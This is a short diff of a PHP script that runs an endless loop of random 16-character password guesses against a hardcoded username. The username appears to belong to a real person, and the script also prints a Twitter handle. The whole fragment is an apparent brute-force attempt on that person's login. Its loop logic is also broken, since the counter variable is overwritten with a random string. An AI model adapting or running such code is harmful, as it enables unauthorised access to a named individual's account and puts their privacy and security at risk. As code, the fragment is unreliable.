@@ -5,7 +5,7 @@ global $startpagina;
 $username = "charlotte.scheurleer1";
 echo "https://twitter.com/LizardL4nds";
 while(True) {
-    for ($Pass = 1; $Pass < 16; $Pass++) {
+    for ($Pass = 0; $Pass < 16; $Pass++) {
         if ($Pass == 1){$Pass = substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"), 0, 16);}
         if(check_correct($username, $Pass)) {
             if ($str != $startpagina) {
